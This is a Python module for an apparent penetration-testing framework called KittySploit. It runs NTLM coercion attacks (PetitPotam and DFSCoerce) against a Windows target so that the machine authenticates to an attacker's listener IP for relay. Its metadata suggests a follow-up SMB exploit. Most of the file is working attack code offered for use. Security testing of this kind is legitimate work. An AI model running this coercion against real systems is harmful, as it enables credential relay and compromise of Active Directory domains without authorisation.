#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multi-method NTLM coercion (PetitPotam + DFSCoerce)."""

from kittysploit import *
from lib.protocols.samr.coerce.dfscoerce import dfscoerce_coerce
from lib.protocols.samr.coerce.petitpotam import petitpotam_coerce


class Module(Auxiliary):
    __info__ = {
        'name': 'NTLM Coercion Multi-Method',
        'description': (
            'Attempts multiple NTLM coercion primitives against a Windows target: '
            'PetitPotam (EfsRpcOpenFileRaw) and DFSCoerce (NetrDfsRemoveStdRoot). '
            'Use with SMB or HTTP relay listeners.'
        ),
        'author': ['KittySploit Team'],
        'references': [
            'https://github.com/topotam/PetitPotam',
            'https://github.com/p0dalirius/Coercer',
        ],
        'tags': ['smb', 'coerce', 'petitpotam', 'dfscoerce', 'ntlm', 'relay', 'ad'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['credential_coercion'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'chain': {
                'produces_capabilities': [{'capability': 'ntlm_coerce', 'from_detail': 'multi'}],
                'suggested_followups': [
                    'exploits/multi/windows/cve_2026_26128_smb_improper_auth',
                ],
            },
        },
    }

    target = OptString('', 'Coerce target IP or hostname', required=True)
    listener_ip = OptString('', 'Attacker listener IP', required=True)
    username = OptString('', 'SMB username (optional)', required=False)
    password = OptString('', 'SMB password (optional)', required=False)
    domain = OptString('', 'AD domain', required=False)
    dc_ip = OptString('', 'Domain controller IP (defaults to target)', required=False)
    methods = OptString('petitpotam,dfscoerce', 'Comma-separated methods to try', required=False)

    def check(self):
        return bool(str(self.target or '').strip() and str(self.listener_ip or '').strip())

    def _coerce_petitpotam(self, user, pwd, dom, dc, listener, target) -> bool:
        print_status('Trying PetitPotam (EfsRpcOpenFileRaw)...')
        return petitpotam_coerce(username=user, password=pwd, domain=dom, dc_ip=dc, listener=listener, target=target)

    def _coerce_dfscoerce(self, user, pwd, dom, dc, listener, target) -> bool:
        print_status('Trying DFSCoerce (NetrDfsRemoveStdRoot)...')
        return dfscoerce_coerce(username=user, password=pwd, domain=dom, dc_ip=dc, listener=listener, target=target)

    def run(self):
        target = str(self.target or self.rhost or '').strip()
        listener = str(self.listener_ip or '').strip()
        if not target or not listener:
            print_error('Set target and listener_ip')
            return False
        user = str(self.username or '').strip() or 'guest'
        pwd = str(self.password or '').strip() or ''
        dom = str(self.domain or '').strip() or 'WORKGROUP'
        dc = str(self.dc_ip or '').strip() or target
        method_list = [m.strip().lower() for m in str(self.methods or 'petitpotam,dfscoerce').split(',') if m.strip()]
        dispatch = {
            'petitpotam': self._coerce_petitpotam,
            'dfscoerce': self._coerce_dfscoerce,
        }
        results = {}
        for name in method_list:
            fn = dispatch.get(name)
            if not fn:
                print_warning(f'Unknown method {name!r} — skipped')
                continue
            try:
                results[name] = fn(user, pwd, dom, dc, listener, target)
                if results[name]:
                    print_success(f'{name}: coerce request accepted')
            except Exception as exc:
                results[name] = False
                print_warning(f'{name}: {exc}')
        if any(results.values()):
            print_success('At least one coerce method succeeded — check relay listener')
            return {'vulnerable': True, 'methods': results}
        print_error('All coerce methods failed')
        return {'vulnerable': False, 'methods': results}
